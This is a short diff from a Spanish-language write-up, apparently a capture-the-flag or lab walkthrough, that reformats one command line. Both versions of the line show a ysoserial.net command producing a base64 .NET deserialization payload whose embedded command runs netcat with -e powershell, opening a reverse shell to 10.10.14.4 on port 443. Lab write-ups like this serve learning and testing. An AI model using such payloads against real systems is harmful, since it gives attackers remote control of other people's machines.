@@ -578,7 +578,7 @@ Para poder realizar este payload serializado usaré la herramienta ysoserial.net
 
 Una vez descargada, desde powershell o cmd la ejecutaremos para serializar el payload con el siguiente comando.
 
-> C:\Users\W10_CFC\Desktop\Release> <span style="color:red">.\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "C:\Temp\netcat.exe -e powershell 10.10.14.4 443" ></span>. 
+> C:\Users\W10_CFC\Desktop\Release> <span style="color:red"> ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "C:\Temp\netcat.exe -e powershell 10.10.14.4 443" </span>. 
 
 Y se nos generará serializado.
 
